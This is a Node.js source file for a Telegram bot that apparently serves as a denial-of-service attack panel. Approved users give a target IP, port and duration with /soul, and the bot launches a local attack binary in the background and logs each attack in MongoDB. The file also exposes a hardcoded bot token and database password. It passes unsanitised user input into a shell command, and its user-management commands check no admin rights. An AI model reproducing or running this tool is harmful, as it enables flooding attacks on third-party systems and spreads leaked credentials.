const TelegramBot = require('node-telegram-bot-api');
const os = require('os');
const mongoose = require('mongoose');
const { exec } = require("child_process");


const bot = new TelegramBot('7824390469:AAG6YaSxzd6gHIl5vA5eBOjUAsByPwPiJ9U', { polling: true });


mongoose.connect('mongodb+srv://rishi:ipxkingyt@rishiv.ncljp.mongodb.net/?retryWrites=true&w=majority&appName=rishiv', {
    useNewUrlParser: true,
    useUnifiedTopology: true
}).then(() => console.log("✅ Connected to MongoDB"))
.catch(err => console.error("❌ MongoDB Connection Error:", err));


const userSchema = new mongoose.Schema({
    userId: String,
    approvalExpiry: Date,
    lastAttackTime: Date
});
const User = mongoose.model('User', userSchema);

const adminIds = ["8024976227", "1600832237", "948895728", "1383324178"];

function getCPUUsage() {
    const cpus = os.cpus();
    let totalIdle = 0, totalTick = 0;

    cpus.forEach(cpu => {
        for (let type in cpu.times) {
            totalTick += cpu.times[type];
        }
        totalIdle += cpu.times.idle;
    });

    return ((1 - totalIdle / totalTick) * 100).toFixed(2);
}

bot.onText(/\/cpu/, (msg) => {
    const cpuUsage = getCPUUsage();
    bot.sendMessage(msg.chat.id, `📊 **Current CPU Usage:**\n\n🔧 CPU Usage: **${cpuUsage}%**`);
});


bot.onText(/\/soul (\S+) (\d+) (\d+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const ip = match[1];
    const port = parseInt(match[2]);
    const duration = parseInt(match[3]);

    // Check if user is approved
    const user = await User.findOne({ userId: chatId.toString() });

    if (!user) {
        return bot.sendMessage(chatId, "❌ You are not authorized to use this command.");
    }

    bot.sendMessage(chatId, `🚀 Attack started on ${ip}:${port} for ${duration} seconds!`);

    // Execute the attack command
    exec(`nohup ./test ${ip} ${port} ${duration} 9 100 > attack.log 2>&1 &`, (error, stdout, stderr) => {
        if (error) {
            return bot.sendMessage(chatId, `❌ Error: ${error.message}`);
        }
        if (stderr) {
            return bot.sendMessage(chatId, `❌ Error: ${stderr}`);
        }
        // Success message, you could log the attack here if needed
        bot.sendMessage(chatId, "✅ Attack executed successfully.");
    });
});

bot.onText(/\/add (\d+)/, async (msg, match) => {
    const userId = match[1];

    let user = await User.findOne({ userId });
    if (user) {
        bot.sendMessage(msg.chat.id, "✅ User is already approved.");
        return;
    }

    await User.create({ userId, approvalExpiry: null, lastAttackTime: null });
    bot.sendMessage(msg.chat.id, `✅ User ${userId} has been added.`);
});

bot.onText(/\/remove (\d+)/, async (msg, match) => {
    const userId = match[1];

    await User.deleteOne({ userId });
    bot.sendMessage(msg.chat.id, `✅ User ${userId} has been removed.`);
});

bot.onText(/\/logs/, async (msg) => {
    const users = await User.find({});
    let response = "📜 **Attack Logs:**\n";

    users.forEach(user => {
        response += `👤 User: ${user.userId} | Last Attack: ${user.lastAttackTime || "N/A"}\n`;
    });

    bot.sendMessage(msg.chat.id, response);
});

bot.onText(/\/broadcast (.+)/, async (msg, match) => {
    const message = match[1];
    const users = await User.find({});

    users.forEach(user => {
        bot.sendMessage(user.userId, `📢 **Broadcast:** ${message}`);
    });

    bot.sendMessage(msg.chat.id, "✅ Broadcast sent to all users.");
});

bot.onText(/\/start/, (msg) => {
    bot.sendMessage(msg.chat.id, "👋 Welcome! Use /help for commands.");
});

bot.onText(/\/help/, (msg) => {
    const helpText = `
📜 **Available Commands:**
- /soul <target> <port> <time> : Start an attack.
- /cpu : Show current CPU usage.
- /add <userId> : Add a user.
- /remove <userId> : Remove a user.
- /logs : Show attack logs.
- /broadcast <message> : Send message to all users.
- /start : Start the bot.
- /help : Show available commands.
    `;
    bot.sendMessage(msg.chat.id, helpText, { parse_mode: "Markdown" });
});

console.log("Bot is running...");
